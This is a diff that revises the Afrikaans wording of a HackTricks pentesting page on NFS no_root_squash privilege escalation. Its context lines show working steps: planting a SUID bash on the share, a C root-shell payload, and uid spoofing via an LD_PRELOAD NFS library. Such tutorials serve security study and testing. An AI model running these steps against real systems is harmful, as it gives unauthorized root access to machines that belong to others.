@@ -1,6 +1,6 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat geconfigureer is as **no_root_squash**, dan kan jy dit **toegang** vanaf **as 'n kliënt** en **binne** daardie gids **skryf** **asof** jy die plaaslike **root** van die masjien was.
+Lees die _ **/etc/exports** _ lêer, as jy 'n gids vind wat geconfigureer is as **no_root_squash**, dan kan jy **toegang** verkry tot dit **as 'n kliënt** en **binne** daardie gids **skryf** **asof** jy die plaaslike **root** van die masjien was.
 
 **no_root_squash**: Hierdie opsie gee basies gesag aan die root-gebruiker op die kliënt om lêers op die NFS-bediener as root te benader. En dit kan lei tot ernstige sekuriteitsimplikasies.
 
@@ -25,7 +25,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-- **Monteer daardie gids** op 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde gids ons saamgecompileerde payload wat die SUID-toestemming sal misbruik, gee dit **SUID** regte, en **voer vanaf die slagoffer** masjien daardie binêre uit (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
+- **Monteer daardie gids** op 'n kliëntmasjien, en **as root kopieer** binne die gemonteerde vouer ons saamgecompileerde payload wat die SUID-toestemming sal misbruik, gee vir dit **SUID** regte, en **voer vanaf die slagoffer** masjien daardie binêre uit (jy kan hier 'n paar [C SUID payloads](payloads-to-execute.md#c) vind).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -43,7 +43,7 @@ cd <SHAREDD_FOLDER>
 
 > [!NOTE]
 > Let daarop dat as jy 'n **tunnel van jou masjien na die slagoffer masjien kan skep, jy steeds die Remote weergawe kan gebruik om hierdie privaatheidsverhoging te exploiteer deur die vereiste poorte te tunnelle**.\
-> Die volgende truuk is in die geval waar die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy nie in enige geval die **remote exploit** kan gebruik nie en jy sal hierdie truuk moet **misbruik**.\
+> Die volgende truuk is in die geval waar die lêer `/etc/exports` **'n IP aandui**. In hierdie geval **sal jy in geen geval die **remote exploit** kan gebruik nie en jy sal hierdie truuk moet **misbruik**.\
 > 'n Ander vereiste vir die exploit om te werk is dat **die eksport binne `/etc/export`** **die `insecure` vlag moet gebruik**.\
 > --_Ek is nie seker of hierdie truuk sal werk as `/etc/export` 'n IP adres aandui nie_--
 
@@ -53,7 +53,7 @@ Die scenario behels die eksploitering van 'n gemonteerde NFS deel op 'n plaaslik
 
 ### Kompilerings van die Biblioteek
 
-Die biblioteek kompileringsstappe mag aanpassings vereis gebaseer op die kern weergawe. In hierdie spesifieke geval was die fallocate syscalls uitgekommenteer. Die kompileringsproses behels die volgende opdragte:
+Die biblioteek kompileringsstappe mag aanpassings vereis gebaseer op die kern weergawe. In hierdie spesifieke geval was die fallocate syscalls kommentaar gegee. Die kompileringsproses behels die volgende opdragte:
 ```bash
 ./bootstrap
 ./configure
@@ -72,7 +72,7 @@ int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Plaas die uitbuiting op die deel en verander sy toestemmings deur die uid te vervals:**
+2. **Plaas die uitbuiting op die deel en wysig sy toestemmings deur die uid te vervals:**
 
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
